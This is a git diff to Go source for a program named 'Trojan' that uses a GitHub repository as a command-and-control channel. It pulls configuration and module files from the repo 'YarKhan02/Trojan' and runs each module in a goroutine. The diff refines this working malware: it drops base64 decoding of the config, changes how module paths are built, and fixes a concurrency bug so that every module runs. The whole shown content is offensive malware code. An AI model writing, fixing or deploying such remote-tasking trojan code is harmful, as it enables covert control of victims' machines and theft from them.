@@ -24,7 +24,7 @@ type Trojan struct {
 	ctx        context.Context
 }
 
-func NewTrojan(id string) (*Trojan, error) {
+func NewTrojan(id string, config string) (*Trojan, error) {
 	client, ctx, err := github_connect()
 	if err != nil {
 		return nil, err
@@ -32,7 +32,7 @@ func NewTrojan(id string) (*Trojan, error) {
 
 	return &Trojan{
 		id:         id,
-		config_file: fmt.Sprintf("%s.json", id),
+		config_file: fmt.Sprintf("%s.json", config),
 		data_path:   fmt.Sprintf("data/%s/", id),
 		client:     client,
 		ctx:        ctx,
@@ -50,13 +50,8 @@ func (t *Trojan) get_config() ([]map[string]interface{}, error) {
 		return nil, fmt.Errorf("failed to get config: %v", err)
 	}
 
-	decoded_bytes, err := base64.StdEncoding.DecodeString(config_json)
-	if err != nil {
-		return nil, fmt.Errorf("failed to decode config: %v", err)
-	}
-
 	var config []map[string]interface{}
-	err = json.Unmarshal(decoded_bytes, &config)
+	err = json.Unmarshal([]byte(config_json), &config)
 	if err != nil {
 		return nil, fmt.Errorf("failed to unmarshal config: %v", err)
 	}
@@ -125,7 +120,7 @@ func github_connect() (*github.Client, context.Context, error) {
 func get_file_contents(dirname string, module_name string, client *github.Client, ctx context.Context) (string, error) {
 	user := "YarKhan02"
 	repo := "Trojan"
-	filePath := dirname + "/" + module_name + ".go"
+	filePath := dirname + "/" + module_name
 	
 
 	file_content, _, _, err := client.Repositories.GetContents(ctx, user, repo, filePath, nil)
@@ -155,7 +150,8 @@ func (t *Trojan) Run() {
 			if !ok {
 				continue
 			}
-
+			
+			wg.Add(1)
 			go func(module string) {
 				defer wg.Done()
 				t.module_runner(module) // Pass module name to module_runner
@@ -173,7 +169,7 @@ func (t *Trojan) Run() {
 }
 
 func main() {
-	trojan, err := NewTrojan("1")
+	trojan, err := NewTrojan("1", "abc")
 	if err != nil {
 		log.Fatal(err)
 	}
